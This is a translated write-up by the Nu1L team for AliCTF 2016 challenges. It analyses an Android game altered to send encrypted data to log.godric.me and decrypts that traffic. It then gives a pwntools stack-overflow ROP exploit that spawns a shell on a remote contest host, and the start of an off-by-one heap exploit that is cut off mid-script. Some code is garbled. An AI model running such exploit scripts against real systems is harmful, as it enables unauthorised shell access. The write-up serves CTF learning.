# [Nu1L] writup-for-Alictf-2016
|
##### 译文声明
本文是翻译文章，文章来源：360安全播报
译文仅供参考，具体内容表达以及含义原文为准。
**MISC**
**coloroverflow**
首先感觉这种包名不像是CTF用的,所以直接Google之,发现是Google Play上开源的游戏Color
Overflow。于是下载下来进行比对,发现多出了几个类无法匹配上原apk,所以猜测是自己后加的。分别将多出的类分析之后,发现分别是用语发送请求、生成请求和工具类。我将其命名为LogClass、n和Utils
程序将请求生成之后向log.godric.me发送POST请求,在代码里发现数据发送之前用经过了GZIP压缩。在pcap中,也发现了这个请求,pcap里显示确实有Content-Encoding: gzip。用wireshark导出http数据得到了原始数据。
现在从LogClass往上找,发现GameView$1里的new LogClass().execute(new
ByteArrayOutputStream[]{v2.OutputRequestBody()});会调用n中的方法。然后LogClass里的run会发送。
        public ByteArrayOutputStream OutputRequestBody() {
            try {
                this.output_stream.reset();
                f.a(this.output_stream, this.szId);
                f.a(this.output_stream, this.CurMill);
                f.a(this.output_stream, this.Rand);
                f.a(this.output_stream, this.d);
                this.output_stream.flush();
            }
            catch(Exception v0) {
                v0.printStackTrace();
            }
            return this.output_stream;
        }
其中d是由要发送的数据进行AES加密后得到的,在GetRequestBody这个方法中。
这部分缓存了要发送的数据。a方法有三个重载,都将输出到缓冲区。分别会先输出对应的类型标志,21、18和24。接下来,字符串类型会字符串长度,然后输出字符串;字节数组会输出一个字节表示长度,然后输出所有字节;长整型会按7位分组然后高位作为结尾标志,每次输出一个字节,高位为0表示结束。
因此我们可以从pcap导出的数据中还原出szId, CurMil, Rand, d。
szId被计算MD5后,摘要作为key(未编码成十六进制字符串),Rand和CurMill进行循环异或得到IV。因此key和IV也可以计算出来。
再来看AES:
                if(i == 0) {
                    int j;
                    for(j = 0; j > (i*8)) & 255 for i in range(8)][::-1]
    IV = [rand[i] ^ IV[i%8] for i in range(len(rand))]
    IV = ''.join(map(chr, IV))
    print 'IV', map(ord, IV)
    with open('encrypted') as f:
        encrypted = f.read()
    from Crypto.Cipher import AES
    aes_d = AES.new(key, AES.MODE_CBC, IV)
    print aes_d.decrypt(encrypted)
**PWN**
**Vss**
存在一个栈溢出,输入的第0x48-0x50个字节刚好覆盖返回地址,用ROPgadget找到一个ropchain,由于第0x48-0x50个字节是返回地址,再找一个add
rsp ret的gadget增加rsp的地址就可以返回到ropchain
    from pwn import *
    from struct import pack
    p = remote('121.40.56.102', 2333)
    recv_content = p.recvuntil('Password:n')
    p2 = ''
    p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret
    p2 += pack('<Q', 0x00000000006c4080) # @ .data
    p2 += pack('<Q', 0x000000000046f208) # pop2 rax ; ret
    p2 += '/bin//sh'
    p2 += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
    p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret
    p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8
    p2 += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
    p2 += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
    p2 += pack('<Q', 0x0000000000401823) # pop2 rdi ; ret
    p2 += pack('<Q', 0x00000000006c4080) # @ .data
    p2 += pack('<Q', 0x0000000000401937) # pop2 rsi ; ret
    p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8
    p2 += pack('<Q', 0x000000000043ae05) # pop2 rdx ; ret
    p2 += pack('<Q', 0x00000000006c4088) # @ .data + 8
    p2 += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
    p2 += pack('<Q', 0x000000000045f2a5) # syscall ; ret
    payload1 = 'py' + 'B' * (0x4e - 0x8) + p64(0x000000000044892a) + 'A' * (0xd0 - 0x50) + p2
    p.sendline(payload1)
    p.interactive()
    fb
    教科书一般的off-by-one
    脚本:
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    import os
    # flag : alictf{FBfbFbfB23666}
    # switches
    DEBUG = 0
    # modify this
    '''
    if DEBUG:
        io = process('./fb')
    else:
        io = remote('121.40.56.102',9733)
    '''
    if DEBUG: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
    return io.recvuntil(delim)
    def rn(count):
    return io.recvn(count)
    def sl(data):
    return io.sendline(data)
    def sn(data):
    return io.send(data)
    def info(string):
    return log.info(string)
    # define interactive functions here
    def menu():
    return ru('Choice:')
    def addmsg(length):
        menu()
        sl('1')
        ru(':')
        sl(str(length))
    return
    def setmsg(index,content):
        menu()
        sl('2')
        ru(':')
        sl(str(index))
        ru(':')
        sl(content)
    return
    def delmsg(index):
        menu()
        sl('3')
        ru(':')
        sl(str(index))
    return
    def leak(addr):
    if 'x0a' in p64(addr): return 'x00'# :<
        setmsg(1, p64(addr) + p32(100))
        delmsg(2)
        buf = ru('Done').rstrip('Done')
    if len(buf) == 0:return 'x00'
    return buf + 'x00'
    printf = 0x4006E0
    ptr = 0x6020c0
    ptr2 = 0x6020e0
    freegot = 0x602018
    # define exploit function here
    def pwn():
    if DEBUG: gdb.attach(io)
    #elf = ELF('./fb')
        addmsg(248)
        addmsg(240)# xxx